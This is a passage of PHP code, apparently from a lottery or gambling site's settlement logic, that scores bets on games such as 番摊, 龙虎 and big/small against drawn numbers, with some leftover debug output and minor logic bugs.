        case '点':
            $ma = $kj[0] + $kj[1] + $kj[2];
            if ($c['name'] == '三军大小') {
                $p['name'] == '三军大' && $ma >= 11 && ($v = 1);
                $p['name'] == '三军小' && $ma < 11 && ($v = 1);
                baozhi($kj[0], $kj[1], $kj[2]) == 1 && ($v = 0);
            } else {
                str_replace('点', '', $p['name']) == $ma && ($v = 1);
            }
            break;
        case "牌":
            if ($c['name'] == '长牌') {
                $two = $p['name'] % 10;
                $one = ($p['name'] - $two) / 10;
                in_array($one, $kj) && in_array($two, $kj) && ($v = 1);
            } else {
                $two = $p['name'] % 10;
                $cs = array_count_values($kj);
                $cs[$two] >= 2 && ($v = 1);
            }
            break;
    }
    return [$v];
}
function moni_103($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft)
{
    $v = 0;
    switch ($p['ztype']) {
        case '番摊':
            switch ($c['name']) {
                case "双面":
                    if ($p['name'] == "单" && $ft % 2 == 1) {
                        $v = 1;
                    } else {
                        if ($p['name'] == "双" && $ft % 2 == 0) {
                            $v = 1;
                        } else {
                            if ($p['name'] == "大" && $ft > 2) {
                                $v = 1;
                            } else {
                                if ($p['name'] == "小" && $ft < 3) {
                                    $v = 1;
                                }
                            }
                        }
                    }
                    break;
                case "番":
                    $ft . "番" == $p['name'] ? $v = 1 : ($v = 0);
                    break;
                case "念":
                    $ps = explode('念', $p["name"]);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if ($ps[1] == $ft) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                case "角":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case "正":
                    $ps = str_replace('正', '', $p['name']);
                    if ($ps > 2) {
                        $psdui = $ps - 2;
                    } else {
                        $psdui = $ps + 2;
                    }
                    if ($ps == $ft) {
                        $v = 1;
                    } else {
                        if ($psdui == $ft) {
                            $v = 0;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
                case "中":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case '加':
                    $ps = explode('加', $p['name']);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if (strpos($ps[1], $ft . "") !== false) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                case '角念中通加':
                    if (strstr($p['name'], '加')) {
                        $ps = explode('加', $p['name']);
                        if ($ps[0] == $ft) {
                            $v = 1;
                        } else {
                            if (strpos($ps[1], $ft . "") !== false) {
                                $v = 2;
                            } else {
                                $v = 0;
                            }
                        }
                    } elseif (strstr($p['name'], '念')) {
                        $ps = explode('念', $p["name"]);
                        if ($ps[0] == $ft) {
                            $v = 1;
                        } else {
                            if ($ps[1] == $ft) {
                                $v = 2;
                            } else {
                                $v = 0;
                            }
                        }
                    } elseif (strstr($p['name'], '中')) {
                        if (strpos($p['name'], $ft . "") !== false) {
                            $v = 1;
                        } else {
                            $v = 0;
                        }
                    } elseif (strstr($p['name'], '通')) {
                        $ps = explode('通', $p["name"]);
                        if ($ps[0] == $ft) {
                            $v = 1;
                        } else {
                            if ($ps[1] == $ft) {
                                $v = 2;
                            } else {
                                $v = 0;
                            }
                        }
                    } elseif (strstr($p['name'], '角')) {
                        if (strpos($p['name'], $ft . "") !== false) {
                            $v = 1;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                default:
                    if ($p['znum1'] == $ft) {
                        $v = 0;
                    } else {
                        if (strpos($p['name'], $ft . "") !== false) {
                            $v = 1;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
            }
            break;
        case '码':
            $b == '正码' ? $ma = $kj : ($ma = [$kj[$c['mtype']]]);
            in_array($p['name'], $ma) ? $v = 1 : ($v = 0);
            break;
        case '特码':
            $ma = [$kj[count($kj) - 1]];
            in_array($p['name'], $ma) ? $v = 1 : ($v = 0);
            break;
        case '单双':
            $c['name'] == '总和单双' ? $ma = $kj[0] + $kj[1] + $kj[2] + $kj[3] + $kj[4] + $kj[5] + $kj[6] + $kj[7] : ($ma = $kj[$c['mtype']]);
            strpos($p['name'], danshuang($ma)) !== false ? $v = 1 : ($v = 0);
            break;
        case '合单双':
            $ma = heshu($kj[$c['mtype']]);
            strpos($p['name'], danshuang($ma)) !== false ? $v = 1 : ($v = 0);
            break;
        case '大小':
            $v = 0;
            if ($c['name'] == '总和大小') {
                echo $ma = $kj[0] + $kj[1] + $kj[2] + $kj[3] + $kj[4] + $kj[5] + $kj[6] + $kj[7];
                $p['name'] == '总和大' && $ma > 84 && ($v = 1);
                $p['name'] == '总和小' && $ma < 84 && ($v = 1);
                $ma == 84 && ($v = 2);
            } else {
                $ma = $kj[$c['mtype']];
                $p['name'] == '小' && $ma <= 10 && ($v = 1);
                $p['name'] == '大' && $ma >= 11 && ($v = 1);
            }
            break;
        case '尾大小':
            if ($c['name'] == '总尾大小') {
                $ma = $kj[0] + $kj[1] + $kj[2] + $kj[3] + $kj[4] + $kj[5] + $kj[6] + $kj[7];
                strpos($p['name'], daxiaow($ma % 10)) !== false && ($v = 1);
            } else {
                $ma = $kj[$c['mtype']];
                strpos($p['name'], daxiaow($ma % 10)) !== false && ($v = 1);
            }
            break;
        case '龙虎':
            $ma = longhuhe($kj[$c['mtype']], $kj[7 - $c['mtype']]);
            $ma == $p['name'] ? $v = 1 : $v = 0;
            break;
        case '方位':
            fangwei($kj[$c['mtype']]) == $p['name'] && ($v = 1);
            break;
        case '中发白':
            zhongfabai($kj[$c['mtype']]) == $p['name'] && ($v = 1);
            break;
        case '连码':
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if ($cc != $p['znum1']) {
                break;
            }
            switch ($p['name']) {
                case '选二任选':
                    in_array($cons[0], $kj) && in_array($cons[1], $kj) && ($v = 1);
                    break;
                case '选三任选':
                    in_array($cons[0], $kj) && in_array($cons[1], $kj) && in_array($cons[2], $kj) && ($v = 1);
                    break;
                case '选四任选':
                    in_array($cons[0], $kj) && in_array($cons[1], $kj) && in_array($cons[2], $kj) && in_array($cons[3], $kj) && ($v = 1);
                    break;
                case '选五任选':
                    in_array($cons[0], $kj) && in_array($cons[1], $kj) && in_array($cons[2], $kj) && in_array($cons[3], $kj) && in_array($cons[4], $kj) && ($v = 1);
                    break;
                case '选二连组':
                    if (in_array($cons[0], $kj)) {
                        $keylm = -1;
                        foreach ($kj as $klm => $vlm) {
                            $cons[0] == $vlm && ($keylm = $klm);
                        }
                        if ($keylm > 0) {
                            ($kj[$keylm - 1] == $cons[1] || $kj[$keylm + 1] == $cons[1]) && ($v = 1);
                        } else {
                            $kj[$keylm + 1] == $cons[1] && ($v = 1);
                        }
                    }
                    break;
                case '选二连直':
                    if (in_array($cons[0], $kj)) {
                        $keylm = -1;
                        foreach ($kj as $klm => $vlm) {
                            $cons[0] == $vlm && ($keylm = $klm);
                        }
                        $kj[$keylm + 1] == $con[1] && ($v = 1);
                    }
                    break;
                case '选三前组':
                    $arrlm = [$kj[0], $kj[1], $kj[2]];
                    in_array($cons[0], $arrlm) && in_array($cons[1], $arrlm) && in_array($cons[2], $arrlm) && ($v = 1);
                    break;
                case '选三前直':
                    $con[0] == $kj[0] && $con[1] == $kj[1] && $con[2] == $kj[2] && ($v = 1);
                    break;
                case '选前二组选':
                    $arr = [$kj[0], $kj[1]];
                    in_array($cons[0], $arr) && in_array($cons[1], $arr) && ($v = 1);
                    break;
                case '选前二直选':
                    $cons[0] == $kj[0] && $cons[1] == $kj[1] && ($v = 1);
                    break;
                case '选前三组选':
                    $arr = [$kj[0], $kj[1], $kj[2]];
                    in_array($cons[0], $arr) && in_array($cons[1], $arr) && in_array($cons[2], $arr) && ($v = 1);
                    break;
                case '选前三直选':
                    $cons[0] == $kj[0] && $cons[1] == $kj[1] && $cons[2] == $kj[2] && ($v = 1);
                    in_array($kj[0], $cons) & in_array($kj[1], $cons) & in_array($kj[2], $cons) & in_array($kj[3], $cons) & in_array($kj[4], $cons) && ($v = 1);
                    break;
            }
            break;
        default:
            $cmd = preg_replace('/\d/', '', $p['name']);
            switch ($cmd) {
                case "单":
                    if ($p['name'] == "单" && $ft % 2 == 1) {
                        $v = 1;
                    }
                    break;
                case "双":
                    if ($p['name'] == "双" && $ft % 2 == 0) {
                        $v = 1;
                    }
                    break;
                case "大":
                    $ma = $kj[$c['mtype']];
                    if ($p['name'] == "大" && $ma >= 11) {
                        $v = 1;
                    }
                    break;
                case "小":
                    $ma = $kj[$c['mtype']];
                    if ($p['name'] == "小" && $ma <= 10) {
                        $v = 1;
                    }
                    break;
                case "番":
                    $ft . "番" == $p['name'] ? $v = 1 : ($v = 0);
                    break;
                case "念":
                    $ps = explode('念', $p["name"]);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if ($ps[1] == $ft) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                case "通":
                    $ps = substr($p["name"], 0, 2);
                    if (strstr($ps, $ft)) {
                        $v = 1;
                    } else {
                        if (($cmd == '一通' && $ft == '1') || ($cmd == '二通' && $ft == '2') || ($cmd == '三通' && $ft == '3') || ($cmd == '四通' && $ft == '4')) {
                            $v = 0;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
                case "角":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case "正":
                    $ps = str_replace('正', '', $p['name']);
                    if ($ps > 2) {
                        $psdui = $ps - 2;
                    } else {
                        $psdui = $ps + 2;
                    }
                    if ($ps == $ft) {
                        $v = 1;
                    } else {
                        if ($psdui == $ft) {
                            $v = 0;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
                case "中":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case '加':
                    $ps = explode('加', $p['name']);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if (strpos($ps[1], $ft . "") !== false) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                default:
                    $ps = substr($p["name"], 0, 2);
                    if (strstr($ps, $ft)) {
                        $v = 1;
                    } else {
                        if (($cmd == '一通' && $ft == '1') || ($cmd == '二通' && $ft == '2') || ($cmd == '三通' && $ft == '3') || ($cmd == '四通' && $ft == '4')) {
                            $v = 0;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
            }
            break;
    }
    return [$v];
}
function moni_107($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft)
{
    $v = 0;
    switch ($p['ztype']) {
        case '番摊':
            switch ($c['name']) {
                case "双面":
                    if ($p['name'] == "单" && $ft % 2 == 1) {
                        $v = 1;
                    } else {
                        if ($p['name'] == "双" && $ft % 2 == 0) {
                            $v = 1;
                        } else {
                            if ($p['name'] == "大" && $ft > 2) {
                                $v = 1;
                            } else {
                                if ($p['name'] == "小" && $ft < 3) {
                                    $v = 1;
                                }
                            }
                        }
                    }
                    break;
                case "番":
                    $ft . "番" == $p['name'] ? $v = 1 : ($v = 0);
                    break;
                case "念":
                    $ps = explode('念', $p["name"]);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if ($ps[1] == $ft) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                case "角":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case "正":
                    $ps = str_replace('正', '', $p['name']);
                    if ($ps > 2) {
                        $psdui = $ps - 2;
                    } else {
                        $psdui = $ps + 2;
                    }
                    if ($ps == $ft) {
                        $v = 1;
                    } else {
                        if ($psdui == $ft) {
                            $v = 0;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
                case "中":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case '加':
                    $ps = explode('加', $p['name']);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if (strpos($ps[1], $ft . "") !== false) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                default:
                    if ($p['znum1'] == $ft) {
                        $v = 0;
                    } else {
                        if (strpos($p['name'], $ft . "") !== false) {
                            $v = 1;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
            }
            break;
        case '码':
            $b == '冠亚军组合' ? $ma = $kj[0] + $kj[1] : ($ma = $kj[$c['mtype']]);
            $ma == $p['name'] ? $v = 1 : ($v = 0);
            break;
        case '单双':
            $b == '冠亚军组合' ? $ma = $kj[0] + $kj[1] : ($ma = $kj[$c['mtype']]);
            strpos($p['name'], danshuang($ma)) !== false ? $v = 1 : ($v = 0);
            break;
        case '大小':
            $v = 0;
            if ($b == '冠亚军组合') {
                $zf = $kj[0] + $kj[1];
                if ($p['name'] == '冠亚大' && $zf > 11) {
                    $v = 1;
                } else {
                    if ($p['name'] == '冠亚小' && $zf <= 11) {
                        $v = 1;
                    }
                }
            } else {
                $ma = $kj[$c['mtype']];
                if ($p['name'] == '大' & $ma >= 6) {
                    $v = 1;
                } else {
                    if ($p['name'] == '小' & $ma <= 5) {
                        $v = 1;
                    }
                }
            }
            break;
        case '龙虎':
            $ma = longhuhe($kj[$c['mtype']], $kj[9 - $c['mtype']]);
            $ma == $p['name'] ? $v = 1 : $v == 0;
            break;
    }
    return [$v];
}
function moni_101($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft)
{
    $v = 0;
    switch ($b) {
        case '番摊':
            switch ($c['name']) {
                case "双面":
                    if ($p['name'] == "单" && $ft % 2 == 1) {
                        $v = 1;
                    } else {
                        if ($p['name'] == "双" && $ft % 2 == 0) {
                            $v = 1;
                        } else {
                            if ($p['name'] == "大" && $ft > 2) {
                                $v = 1;
                            } else {
                                if ($p['name'] == "小" && $ft < 3) {
                                    $v = 1;
                                }
                            }
                        }
                    }
                    break;
                case "番":
                    $ft . "番" == $p['name'] ? $v = 1 : ($v = 0);
                    break;
                case "念":
                    $ps = explode('念', $p["name"]);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if ($ps[1] == $ft) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                case "角":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case "正":
                    $ps = str_replace('正', '', $p['name']);
                    if ($ps > 2) {
                        $psdui = $ps - 2;
                    } else {
                        $psdui = $ps + 2;
                    }
                    if ($ps == $ft) {
                        $v = 1;
                    } else {
                        if ($psdui == $ft) {
                            $v = 0;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
                case "中":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case '加':
                    $ps = explode('加', $p['name']);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if (strpos($ps[1], $ft . "") !== false) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                default:
                    if ($p['znum1'] == $ft) {
                        $v = 0;
                    } else {
                        if (strpos($p['name'], $ft . "") !== false) {
                            $v = 1;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
            }
            break;
        case '1~5':
            $ma = $kj[$c['mtype']];
            switch ($p['ztype']) {
                case "码":
                    $ma == $p['name'] ? $v = 1 : ($v = 0);
                    break;
                case "单双":
                    strpos($p['name'], danshuang($ma)) !== false ? $v = 1 : ($v = 0);
                    break;
                case "大小":
                    echo $ma;
                    if (($p['name'] == "大" && $ma >= 5) || ($p['name'] == "小" && $ma < 5)) {
                        $v = 1;
                    }
                    break;
            }
            break;
        case '1字组合':
            $arr = [];
            switch ($c['cm']) {
                case "全部":
                    $arr = $kj;
                    break;
                case '前三':
                    $arr = [$kj[0], $kj[1], $kj[2]];
                    break;
                case '中三':
                    $arr = [$kj[1], $kj[2], $kj[3]];
                    break;
                case '后三':
                    $arr = [$kj[2], $kj[3], $kj[4]];
                    break;
            }
            if (in_array($p['name'], $arr)) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '2字组合':
            $arr = [];
            if (strpos($p['name'], '前三') !== false) {
                $arr = [$kj[0], $kj[1], $kj[2]];
            } else {
                if (strpos($p['name'], '中三') !== false) {
                    $arr = [$kj[1], $kj[2], $kj[3]];
                } else {
                    if (strpos($p['name'], '后三') !== false) {
                        $arr = [$kj[2], $kj[3], $kj[4]];
                    }
                }
            }
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if (in_array($cons[0], $arr) && in_array($cons[1], $arr) && $cc == 2) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '2字定位':
            $pnames = str_replace("定位", "", $p['name']);
            switch ($pnames) {
                case '万千':
                    $arr = [$kj[0], $kj[1]];
                    break;
                case '万百':
                    $arr = [$kj[0], $kj[2]];
                    break;
                case '万十':
                    $arr = [$kj[0], $kj[3]];
                    break;
                case '万个':
                    $arr = [$kj[0], $kj[4]];
                    break;
                case '千百':
                    $arr = [$kj[1], $kj[2]];
                    break;
                case '千十':
                    $arr = [$kj[1], $kj[3]];
                    break;
                case '千个':
                    $arr = [$kj[0], $kj[4]];
                    break;
                case '百十':
                    $arr = [$kj[2], $kj[3]];
                    break;
                case '百个':
                    $arr = [$kj[2], $kj[4]];
                    break;
                case '十个':
                    $arr = [$kj[3], $kj[4]];
                    break;
            }
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if ($cons[0] == $arr[0] && $cons[1] == $arr[1] && $cc == 2) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '2字和数':
            switch ($c['cm']) {
                case '万千':
                    $arr = $kj[0] + $kj[1];
                    break;
                case '万百':
                    $arr = $kj[0] + $kj[2];
                    break;
                case '万十':
                    $arr = $kj[0] + $kj[3];
                    break;
                case '万个':
                    $arr = $kj[0] + $kj[4];
                    break;
                case '千百':
                    $arr = $kj[1] + $kj[2];
                    break;
                case '千十':
                    $arr = $kj[1] + $kj[3];
                    break;
                case '千个':
                    $arr = $kj[1] + $kj[4];
                    break;
                case '百十':
                    $arr = $kj[2] + $kj[3];
                    break;
                case '百个':
                    $arr = $kj[2] + $kj[4];
                    break;
                case '十个':
                    $arr = $kj[3] + $kj[4];
                    break;
            }
            if (strpos('[单双]', $p['name'])) {
                $p['name'] == danshuang($arr) ? $v = 1 : ($v = 0);
            } else {
                $tmp = daxiaow($arr % 10);
                strpos($p['name'], $tmp) !== false ? $v = 1 : ($v = 0);
            }
            break;
        case '3字组合':
            if (strpos($p['name'], '前三') !== false) {
                $arr = [$kj[0], $kj[1], $kj[2]];
            } else {
                if (strpos($p['name'], '中三') !== false) {
                    $arr = [$kj[1], $kj[2], $kj[3]];
                } else {
                    if (strpos($p['name'], '后三') !== false) {
                        $arr = [$kj[2], $kj[3], $kj[4]];
                    }
                }
            }
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if (in_array($cons[0], $arr) && in_array($cons[1], $arr) && in_array($cons[2], $arr) && $cc == 3) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '3字定位':
            if (strpos($p['name'], '前三') !== false) {
                $arr = [$kj[0], $kj[1], $kj[2]];
            } else {
                if (strpos($p['name'], '中三') !== false) {
                    $arr = [$kj[1], $kj[2], $kj[3]];
                } else {
                    if (strpos($p['name'], '后三') !== false) {
                        $arr = [$kj[2], $kj[3], $kj[4]];
                    }
                }
            }
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if ($arr[0] == $cons[0] & $arr[1] == $cons[1] & $arr[2] == $cons[2] && $cc == 3) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case "3字和数":
            switch ($c['cm']) {
                case '前三':
                    $arr = $kj[0] + $kj[1] + $kj[2];
                    break;
                case '中三':
                    $arr = $kj[1] + $kj[2] + $kj[3];
                    break;
                case '后三':
                    $arr = $kj[2] + $kj[3] + $kj[4];
                    break;
            }
            if (strpos('[和单和双]', $p['name']) !== false) {
                $tmp = danshuang($arr);
                if (strpos($p['name'], $tmp)) {
                    $v = 1;
                } else {
                    $v = 0;
                }
            } else {
                if (strpos('[和大和小]', $p['name']) !== false) {
                    if ($arr >= 14 && $p['name'] == '和大' || $arr <= 13 & $p['name'] == '和小') {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                } else {
                    if (strpos('[和尾大和尾小]', $p['name']) !== false) {
                        $tmp = daxiaow($arr % 10);
                        if (strpos($p['name'], $tmp)) {
                            $v = 1;
                        } else {
                            $v = 0;
                        }
                    }
                }
            }
            break;
        case '总和龙虎':
            $ma = $kj[0] + $kj[1] + $kj[2] + $kj[3] + $kj[4];
            switch ($p['name']) {
                case '总和单':
                case '总和双':
                    strpos($p['name'], danshuang($ma)) !== false ? $v = 1 : ($v = 0);
                    break;
                case '总和大':
                    $ma >= 23 ? $v = 1 : ($v = 0);
                    break;
                case '总和小':
                    $ma <= 22 ? $v = 1 : ($v = 0);
                    break;
                case '总和尾大':
                case '总和尾小':
                    strpos($p['name'], daxiaow($ma % 10)) !== false ? $v = 1 : ($v = 0);
                    break;
                case "龙":
                case "虎":
                case "和":
                    $tmp = longhuhe($kj[0], $kj[4]);
                    $tmp == $p['name'] && ($v = 1);
                    $tmp == '和' && $p['name'] != '和' && ($v = 2);
                    break;
            }
            break;
        case '组选3':
            if (strpos($p['name'], '前三') !== false) {
                $arr = [$kj[0], $kj[1], $kj[2]];
            } else {
                if (strpos($p['name'], '中三') !== false) {
                    $arr = [$kj[1], $kj[2], $kj[3]];
                } else {
                    if (strpos($p['name'], '后三') !== false) {
                        $arr = [$kj[2], $kj[3], $kj[4]];
                    }
                }
            }
            if (duizhi($arr[0], $arr[1], $arr[2]) != 1) {
                $v = 0;
                break;
            }
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if (in_array($arr[0], $cons) && in_array($arr[1], $cons) && in_array($arr[2], $cons)) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '组选6':
            if (strpos($p['name'], '前三') !== false) {
                $arr = [$kj[0], $kj[1], $kj[2]];
            } else {
                if (strpos($p['name'], '中三') !== false) {
                    $arr = [$kj[1], $kj[2], $kj[3]];
                } else {
                    if (strpos($p['name'], '后三') !== false) {
                        $arr = [$kj[2], $kj[3], $kj[4]];
                    }
                }
            }
            if (duizhi($arr[0], $arr[1], $arr[2]) == 1 | baozhi($arr[0], $arr[1], $arr[2]) == 1) {
                $v = 0;
                break;
            }
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if (in_array($arr[0], $cons) && in_array($arr[1], $cons) && in_array($arr[2], $cons)) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '跨度':
            switch ($c['cm']) {
                case '前三':
                    $k1 = abs($kj[0] - $kj[1]);
                    $k2 = abs($kj[0] - $kj[2]);
                    $k3 = abs($kj[1] - $kj[2]);
                    $k = max($k1, $k2, $k3);
                    break;
                case '中三':
                    $k1 = abs($kj[1] - $kj[2]);
                    $k2 = abs($kj[1] - $kj[3]);
                    $k3 = abs($kj[2] - $kj[3]);
                    $k = max($k1, $k2, $k3);
                    break;
                case '后三':
                    $k1 = abs($kj[2] - $kj[3]);
                    $k2 = abs($kj[2] - $kj[4]);
                    $k3 = abs($kj[3] - $kj[4]);
                    $k = max($k1, $k2, $k3);
                    break;
            }
            $k == $p['name'] ? $v = 1 : ($v = 0);
            break;
        case '前中后三':
            switch ($c['cm']) {
                case '前三':
                    $k1 = $kj[0];
                    $k2 = $kj[1];
                    $k3 = $kj[2];
                    break;
                case '中三':
                    $k1 = $kj[1];
                    $k2 = $kj[2];
                    $k3 = $kj[3];
                    break;
                case '后三':
                    $k1 = $kj[2];
                    $k2 = $kj[3];
                    $k3 = $kj[4];
                    break;
            }
            switch ($p['name']) {
                case '豹子':
                    $vv = baozhi($k1, $k2, $k3);
                    $vv == 1 ? $v = 1 : ($v = 0);
                    break;
                case '顺子':
                    $vv = shunzhi($k1, $k2, $k3);
                    $vv == 1 ? $v = 1 : ($v = 0);
                    break;
                case '对子':
                    $vv = duizhi($k1, $k2, $k3);
                    $vv == 1 ? $v = 1 : ($v = 0);
                    break;
                case '半顺':
                    $vv = banshun($k1, $k2, $k3);
                    $vv == 1 ? $v = 1 : ($v = 0);
                    break;
                case '杂六':
                    $vv = zaliu($k1, $k2, $k3);
                    $vv == 1 ? $v = 1 : ($v = 0);
                    break;
            }
            break;
    }
    return [$v];
}
function moni_163($fenlei, $gid, $kj, $b, $s, $c, $p, $con, $ft)
{
    $v = 0;
    switch ($b) {
        case '番摊':
            switch ($c['name']) {
                case "双面":
                    if ($p['name'] == "单" && $ft % 2 == 1) {
                        $v = 1;
                    } else {
                        if ($p['name'] == "双" && $ft % 2 == 0) {
                            $v = 1;
                        } else {
                            if ($p['name'] == "大" && $ft > 2) {
                                $v = 1;
                            } else {
                                if ($p['name'] == "小" && $ft < 3) {
                                    $v = 1;
                                }
                            }
                        }
                    }
                    break;
                case "番":
                    $ft . "番" == $p['name'] ? $v = 1 : ($v = 0);
                    break;
                case "念":
                    $ps = explode('念', $p["name"]);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if ($ps[1] == $ft) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                case "角":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case "正":
                    $ps = str_replace('正', '', $p['name']);
                    if ($ps > 2) {
                        $psdui = $ps - 2;
                    } else {
                        $psdui = $ps + 2;
                    }
                    if ($ps == $ft) {
                        $v = 1;
                    } else {
                        if ($psdui == $ft) {
                            $v = 0;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
                case "中":
                    if (strpos($p['name'], $ft . "") !== false) {
                        $v = 1;
                    } else {
                        $v = 0;
                    }
                    break;
                case '加':
                    $ps = explode('加', $p['name']);
                    if ($ps[0] == $ft) {
                        $v = 1;
                    } else {
                        if (strpos($ps[1], $ft . "") !== false) {
                            $v = 2;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
                default:
                    if ($p['znum1'] == $ft) {
                        $v = 0;
                    } else {
                        if (strpos($p['name'], $ft . "") !== false) {
                            $v = 1;
                        } else {
                            $v = 2;
                        }
                    }
                    break;
            }
            break;
        case '1~3':
            $ma = $kj[$c['mtype']];
            switch ($p['ztype']) {
                case "码":
                    $ma == $p['name'] ? $v = 1 : ($v = 0);
                    break;
                case "单双":
                    strpos($p['name'], danshuang($ma)) !== false ? $v = 1 : ($v = 0);
                    break;
                case "大小":
                    if ($p['name'] == "大" && $ma > 5) {
                        $v = 1;
                    } else {
                        if ($p['name'] == "小" && $ma < 5) {
                            $v = 1;
                        } else {
                            $v = 0;
                        }
                    }
                    break;
            }
            break;
        case '1字组合':
            $arr = $kj;
            if (in_array($p['name'], $arr)) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '2字组合':
            $arr = [];
            $arr = [$kj[0], $kj[1], $kj[2]];
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if (in_array($cons[0], $arr) && in_array($cons[1], $arr) && $cc == 2) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '2字定位':
            $pnames = str_replace("定位", "", $p['name']);
            switch ($pnames) {
                case '百十':
                    $arr = [$kj[2], $kj[3]];
                    break;
                case '百个':
                    $arr = [$kj[2], $kj[4]];
                    break;
                case '十个':
                    $arr = [$kj[3], $kj[4]];
                    break;
            }
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if ($cons[0] == $arr[0] && $cons[1] == $arr[1] && $cc == 2) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '2字和数':
            switch ($c['cm']) {
                case '百十':
                    $arr = $kj[2] + $kj[3];
                    break;
                case '百个':
                    $arr = $kj[2] + $kj[4];
                    break;
                case '十个':
                    $arr = $kj[3] + $kj[4];
                    break;
            }
            if (strpos('[单双]', $p['name'])) {
                $p['name'] == danshuang($arr) ? $v = 1 : ($v = 0);
            } else {
                $tmp = daxiaow($arr % 10);
                strpos($p['name'], $tmp) !== false ? $v = 1 : ($v = 0);
            }
            break;
        case '3字组合':
            $arr = $kj;
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if (in_array($cons[0], $arr) && in_array($cons[1], $arr) && in_array($cons[2], $arr) && $cc == 3) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '3字定位':
            $arr = $kj;
            $cons = explode('-', $con);
            $cons = array_unique($cons);
            $cc = count($cons);
            if ($arr[0] == $cons[0] & $arr[1] == $cons[1] & $arr[2] == $cons[2] && $cc == 3) {
                $v = 1;
            } else {
                $v = 0;
            }
            break;
        case '总和龙虎':
            $ma = $kj[0] + $kj[1] + $kj[2];
            switch ($p['name']) {
                case '总和单':
                case '总和双':
                    strpos($p['name'], danshuang($ma)) !== false ? $v = 1 : ($v = 0);
                    $ma == 14 && $p['name'] == "总和双" && ($v = 2);
                    $ma == 13 && $p['name'] == "总和单" && ($v = 2);
                    break;
                case '总和大':
                    $ma > 14 ? $v = 1 : ($v = 0);
                    $ma == 14 && ($v = 2);
                    break;
                case '总和小':
                    $ma < 13 ? $v = 1 : ($v = 0);
                    $ma == 13 && ($v = 2);
                    break;
                case '总和尾大':
                case '总和尾小':
                    strpos($p['name'], daxiaow($ma % 10)) !== false ? $v = 1 : ($v = 0);
                    break;
                case "龙":
                case "虎":
                case "和":
                    $tmp = longhuhe($kj[0], $kj[2]);
                    $tmp == $p['name'] ? $v = 1 : ($v = 0);
